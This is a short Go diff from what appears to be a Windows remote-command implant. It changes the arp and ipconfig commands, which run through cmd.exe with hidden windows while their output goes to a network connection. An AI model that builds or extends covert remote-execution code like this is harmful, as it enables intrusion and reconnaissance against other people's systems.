@@ -77,7 +77,7 @@ func main(){
 
 		// Simple systeminfo call. Output redirect to conn stream
 		if firstCmd == "arp" {
-			cmdInstance := exec.Command(cmdPath, "/q", "/c", "arp", "-n")
+			cmdInstance := exec.Command(cmdPath, "/q", "/c", "arp")
 
 			// Set-up o streams to conn. Set option to hide windows when calling system command
 			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
@@ -99,7 +99,7 @@ func main(){
 		}
 
 		if firstCmd == "ipconfig" {
-			cmdInstance := exec.Command(cmdPath, "/q", "/c", "ipconfig", "-a", "-n")
+			cmdInstance := exec.Command(cmdPath, "/q", "/c", "ipconfig")
 
 			// Set-up o streams to conn. Set option to hide windows when calling system command
 			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
